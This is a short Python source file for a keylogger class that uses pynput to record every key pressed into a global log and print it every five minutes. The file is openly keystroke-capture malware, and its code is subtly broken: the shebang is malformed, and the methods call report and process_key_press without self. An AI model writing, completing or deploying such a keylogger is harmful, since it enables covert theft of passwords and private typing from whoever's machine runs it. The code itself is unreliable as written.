#!usr/bin/env python
import pynput.keyboard
import threading

log = ""

class Keylogger:
    def process_key_press(self,key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " +str(key) + " "
        # print(log)

    # this is used to set the timer and intervals
    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(300,report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
        with keyboard_listener:
            report()
            keyboard_listener.join()
